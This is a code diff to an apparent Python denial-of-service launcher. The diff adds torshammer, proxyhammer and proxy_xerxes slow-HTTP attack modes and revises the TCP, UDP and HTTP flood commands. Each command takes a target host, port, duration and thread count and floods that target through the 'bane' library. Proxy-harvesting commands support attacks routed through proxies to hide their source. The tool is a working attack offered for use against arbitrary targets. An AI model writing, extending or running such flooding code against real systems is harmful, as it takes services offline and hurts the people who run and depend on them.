@@ -11,7 +11,6 @@
 
 import pyfiglet
 from colorama import Fore, Style
-import time
 import sys
 import os
 
@@ -76,52 +75,90 @@ while True:
 		os.system("clear")
 		banner()
 	elif console == "ddos":
-		print(b + "tcpflood:" + r , "Type tcpflood command to do tcpflood ddos attack")
-		print(b + "udpflood:" + r , "Type udpflood command to do udpflood ddos attack")
+		print(b + "tcpflood:" + r , "Type tcpflood command to do tcpflood dos attack")
+		print(b + "udpflood:" + r , "Type udpflood command to do udpflood dos attack")
 		print(b + "httpflood:" + r ,"Type httpflood command to do normal httpflood ddos attack without proxies")
 		print(b + "proxyhttpflood:" + r , "Type proxyhttpflood command to do http flood attack with proxy")
-		
+		print(b + "torshammer:" + r , "Type torshammer command to do slow http post flood  . ")
+		print(b + "proxyhammer:" + r , "Type proxyhammer command to do slow http post attack using proxy instead of tor ")
+		print(b + "proxy_xerxes:" + r, "Type proxy_xerxes command to do xerxes attack using proxies ")
 	elif console == "proxies":
 		print(b + "http_proxy:" + r , "Type http_proxy command to find http proxies")
 		print(b + "socks4_proxy:" + r , "Type socks4_proxy command to find socks4 proxies")
 		print(b + "socks5_proxy:" + r , "Type socks5_proxy command to find socks5 proxies")
 		
 	elif console == "tcpflood":
-		target = input(Fore.CYAN + "[+] Enter Target IP or website name  to attack : ")
-		port = int(input(Fore.CYAN + "[+] Enter Port Number : "))
-		time = int(input(Fore.CYAN + "[+] Enter Time Duration for attack : "))
-		th = int(input(Fore.CYAN + "[+] Enter Number of Threads : "))
-		print(r + "[+] Attack Started TARGET  ->> {}" .format(target))
-		bane.tcp_flood(target, p=port, min_size=10, max_size=20, interval=0.001, threads=th, timeout=time, logs=True)
+		target = str(input(Fore.CYAN + "[+] Enter Target IP or website name  to attack : " ))
+		port = int(input(Fore.CYAN + "[+] Enter Port Number : " ))
+		time = int(input(Fore.CYAN + "[+] Enter Time Duration for attack : " ))
+		th = int(input(Fore.CYAN + "[+] Enter Number of Threads : " ))
+		print(reset)
+		print(b + "[+] Attack Started TARGET  ->> {}" .format(target))
+		bane.tcp_flood(target, p=port, min_size=10, max_size=20, interval=0.001, threads=th, timeout=5, duration=time, logs=True)
+
 	elif console == "udpflood":
-		ip = input(Fore.CYAN + "[+] Enter Target IP or website name  to attack :")
+		ip = str(input(Fore.CYAN + "[+] Enter Target IP or website name  to attack :"))
 		po = int(input(Fore.CYAN + "[+] Enter Port Number : "))
-		th = int(input(Fore.CYAN + "[+] Enter Time Duration for attack : "))
-		print(r + "[+] Attack Started TARGET  ->> {}" .format(ip))
-		bane.udp_flood(ip, p=po, min_size=10, max_size=20, interval=0.001, timeout=th, logs=True)
+		th = int(input(Fore.CYAN + "[+] Enter Time Duration for attack : " ))
+		print(reset)
+		print(b + "[+] Attack Started TARGET  ->> {}" .format(ip))
+		bane.udp_flood(ip, p=po, min_size=10, max_size=20, interval=0.001, duration=th,  logs=True)
+
 	elif console == "httpflood":
-		ip = input(Fore.CYAN + "[+] Enter Target IP or website name  to attack :")
-		po = int(input(Fore.CYAN + "[+] Enter Port Number : "))
-		th = int(input(Fore.CYAN + "[+] Enter Time Duration for attack : "))
-		threading = int(input(Fore.CYAN + "[+] Enter number of Threads : "))
-		print(r + "[+] Attack Started TARGET  ->> {}" .format(ip))
-		bane.http_spam(ip, p=po, interval=0.001, threads=threading, timeout=th, logs=True)
+		ip = str(input(Fore.CYAN + "[+] Enter Target IP or website name  to attack :"))
+		po = int(input(Fore.CYAN + "[+] Enter Port Number : " ))
+		th = int(input(Fore.CYAN + "[+] Enter Time Duration for attack : " ))
+		threading = int(input(Fore.CYAN + "[+] Enter number of Threads : " ))
+		print(reset)
+		print(b + "[+] Attack Started TARGET  ->> {}" .format(ip))
+		bane.http_spam(ip, p=po, interval=0.001, threads=threading, timeout=5, duration=th, logs=True)
+
 	elif console == "proxyhttpflood":
-		target = input(Fore.CYAN + "[+] Enter Target IP or website name  to attack : ")
-		port = int(input(Fore.CYAN + "[+] Enter Port Number : "))
-		time = int(input(Fore.CYAN + "[+] Enter Time Duration for attack : "))
-		th = int(input(Fore.CYAN + "[+] Enter Number of Threads : "))
-		print(r + "[+] Attack Started TARGET  ->> {}" .format(target))
-		bane.prox_http_spam(target, p=port, interval=0.001, threads=th, timeout=time, logs=True)
+		target = str(input(Fore.CYAN + "[+] Enter Target IP or website name  to attack : " ))
+		port = int(input(Fore.CYAN + "[+] Enter Port Number : " ))
+		time = int(input(Fore.CYAN + "[+] Enter Time Duration for attack : " ))
+		th = int(input(Fore.CYAN + "[+] Enter Number of Threads : " ))
+		print(reset)
+		print(b + "[+] Attack Started TARGET  ->> {}" .format(target))
+		bane.prox_http_spam(target, p=port, interval=0.001, threads=th, timeout=5, duration=time, logs=True)
+
+	elif console == "torshammer":
+		target = str(input(Fore.CYAN + "[+] Enter target ip or website name to attack : " ))
+		po = int(input(Fore.CYAN + "[+] Enter Target port number : " ))
+		th = int(input(Fore.CYAN + "[+] Enter Number of Threads : " ))
+		time = int(input(Fore.CYAN + "[+] Enter Time Duration for attack : " ))
+		print(reset)
+		print(b + "[+] Attack Started TARGET  ->> {}" .format(target))
+		bane.torshammer(target, p=po, duration=time,  threads=th, timeout=5, logs=True)
+		
+	elif console == "proxyhammer":
+		target = str(input(Fore.CYAN + "[+] Enter Target IP or website name  to attack : "))
+		port = int(input(Fore.CYAN + "[+] Enter Port Number : " ))
+		time = int(input(Fore.CYAN + "[+] Enter Time Duration for attack : " ))
+		th = int(input(Fore.CYAN + "[+] Enter Number of Threads : " ))
+		print(reset)
+		print(b + "[+] Attack Started TARGET  ->> {}" .format(target))
+		bane.prox_hammer(target, p=port, duration=time, threads=th, timeout=5, logs=True)
+
+	elif console == "proxy_xerxes":
+		target = str(input(Fore.CYAN + "[+] Enter Target IP or website name  to attack : " ))
+		port = int(input(Fore.CYAN + "[+] Enter Port Number : ") )
+		time = int(input(Fore.CYAN + "[+] Enter Time Duration for attack : " ))
+		th = int(input(Fore.CYAN + "[+] Enter Number of Threads : " ))
+		print(reset)
+		print(b + "[+] Attack Started TARGET  ->> {}" .format(target))
+		bane.prox_xerxes(target, p=port, duration=time, threads=th, timeout=5, logs=True)
+
+
 	elif console == "http_proxy":
-		number = input(r + "[+] How many http proxy you want : ")
+		number = input(r + "[+] How many http proxy you want : " )
 		print(r + "[+] Finding Http proxies ...")
 		print(reset)
 		a = bane.masshttp(int(number))
 		print(a)
 	
 	elif console == "socks4_proxy":
-		no = input(r + "[+] How many socks4 proxy you want : ")
+		no = input(r + "[+] How many socks4 proxy you want : " )
 		print(r + "[+] Finding socks4 proxies ..")
 		print(reset)
 		proxy = bane.massocks4(int(no))
@@ -132,9 +169,41 @@ while True:
 		print(reset)
 		proxy = bane.massocks5(int(no))
 		print(proxy)
+	
+
 	else:
 		print(b + "[!] Enter Correct Command . Type help command to see help menu")
 		print(reset)	
+
+
+
+
+			
+
+
+
+
+
+
+
+	
+
+
+
+
+
+	
+
+
+
+
+
+
+
+
+
+
+
 
 
 
